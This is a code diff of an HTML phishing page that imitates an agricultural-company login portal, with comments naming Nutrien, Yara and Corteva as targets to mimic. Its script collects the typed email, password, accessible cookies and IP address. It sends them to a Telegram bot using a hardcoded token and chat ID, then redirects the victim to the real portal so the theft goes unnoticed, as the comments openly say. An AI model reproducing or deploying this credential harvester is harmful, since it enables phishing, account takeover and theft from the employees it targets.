@@ -3,89 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Login</title>
-    <!-- Use inline CSS to mimic Nutrien/Yara/Corteva -->
+    <title>Agri-Portal Login</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; }
-        .logo { text-align: center; margin-bottom: 20px; font-weight: bold; color: #005a9e; font-size: 24px; } /* Change color to match your target */
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #005a9e; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #f4f6f8; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .login-box { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+            width: 360px; 
+        }
+        .logo { 
+            text-align: center; 
+            margin-bottom: 25px; 
+            font-weight: 600; 
+            color: #005a9e; /* Change to match your target brand */
+            font-size: 22px; 
+            letter-spacing: 0.5px;
+        }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ddd; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            font-size: 15px;
+            transition: border 0.3s;
+        }
+        input:focus { border-color: #005a9e; outline: none; }
+        button { 
+            width: 100%; 
+            padding: 13px; 
+            background: #005a9e; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: 500;
+            transition: background 0.3s;
+        }
         button:hover { background: #004a85; }
-        .error { color: red; font-size: 12px; display: none; margin-top: 10px; }
-        .loading { display: none; text-align: center; margin-top: 10px; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .loading { 
+            display: none; 
+            text-align: center; 
+            margin-top: 15px; 
+            color: #666; 
+            font-size: 14px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #ccc;
+            border-radius: 50%;
+            border-top-color: #005a9e;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="login-box">
-    <div class="logo">AGRI PORTAL</div> <!-- Change to "NUTRIEN" or "YARA" -->
+    <!-- CHANGE THIS TEXT TO MATCH YOUR TARGET (e.g., NUTRIEN, YARA, CORTeva) -->
+    <div class="logo">PORTAL LOGIN</div> 
+    
     <form id="loginForm">
-        <input type="email" id="email" name="email" placeholder="Work Email" required>
-        <input type="password" id="password" name="password" placeholder="Password" required>
+        <div class="input-group">
+            <label for="email">Email or Employee ID</label>
+            <input type="email" id="email" name="email" placeholder="name@company.com" required autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="••••••••" required>
+        </div>
+        
         <button type="submit" id="submitBtn">Sign In</button>
-        <div class="loading" id="loading">Authenticating...</div>
-        <div class="error" id="error">Invalid credentials. Please try again.</div>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div> Verifying credentials...
+        </div>
     </form>
 </div>
 
 <script>
-    // CONFIGURATION
-    const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
-    const TARGET_SITE = 'https://portal.nutrien.com'; // Redirect here after harvest
+    // --- CONFIGURATION ---
+    const TELEGRAM_BOT_TOKEN = '8684628548:AAHRi5CTh8Gf0s9NBdgo4FqT4czGUxplExQ';
+    const TELEGRAM_CHAT_ID = '6479764005';
+    
+    // REPLACE THIS WITH THE ACTUAL TARGET URL (e.g., Nutrien, Yara, etc.)
+    // This is where the user goes after we steal their data, so they don't notice.
+    const TARGET_SITE = 'https://portal.nutrien.com'; 
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const btn = document.getElementById('submitBtn');
-        const loading = document.getElementById('loading');
-        const error = document.getElementById('error');
-
-        btn.style.display = 'none';
-        loading.style.display = 'block';
-
-        // 1. Capture the Session Cookie (Crucial)
-        // We grab the cookie *after* the browser processes the login request, 
-        // but since we are intercepting, we grab the current cookie jar.
-        // Note: If the target site sets "HttpOnly" cookies, you can't read them via JS 
-        // unless you are on the same domain or use a proxy. 
-        // However, for harvesting *into* a Telegram group, we send what we have.
-        const sessionCookie = document.cookie; 
-
-        // 2. Send Data to Telegram
-        const message = `
-🔓 <b>New Login Attempt</b>
-📧 Email: <code>${email}</code>
-🔑 Password: <code>${password}</code>
-🍪 Cookie: <code>${sessionCookie}</code>
-🌐 IP: ${getIP()}
-        `;
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        }).then(() => {
-            // 3. Success State
-            loading.innerText = "Login Successful! Redirecting...";
-            setTimeout(() => {
-                window.location.href = TARGET_SITE;
-            }, 2000);
-        }).catch(err => {
-            console.error('Exfil failed', err);
-            // Fallback: Still redirect them so they don't get suspicious
-            window.location.href = TARGET_SITE;
-        });
-    });
-
-    // Helper to get IP (Cloudflare passes it, or use a free API)
+    // Helper to get IP address
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -95,6 +118,68 @@
             return 'Unknown';
         }
     }
+
+    // Helper to send to Telegram
+    async function sendToTelegram(data) {
+        const message = `
+🔓 <b>New Agri-Portal Login</b>
+📧 Email: <code>${data.email}</code>
+🔑 Pass: <code>${data.password}</code>
+🍪 Cookie: <code>${data.cookie}</code>
+🌐 IP: <code>${data.ip}</code>
+🕒 Time: ${new Date().toLocaleString()}
+        `;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    }
+
+    // Main Form Handler
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const btn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+
+        // UI Updates
+        btn.disabled = true;
+        btn.innerText = 'Signing in...';
+        loading.style.display = 'block';
+
+        // Capture Cookies
+        // Note: HttpOnly cookies won't show up here, but we grab whatever is accessible.
+        const cookie = document.cookie || "(No accessible cookies detected)";
+
+        // Get IP
+        const ip = await getIP();
+
+        // Prepare Data
+        const data = {
+            email: email,
+            password: password,
+            cookie: cookie,
+            ip: ip
+        };
+
+        // Exfiltrate
+        await sendToTelegram(data);
+
+        // Redirect to the real site to maintain trust
+        // Small delay to make it feel "real"
+        setTimeout(() => {
+            window.location.href = TARGET_SITE;
+        }, 1500);
+    });
 </script>
 
 </body>
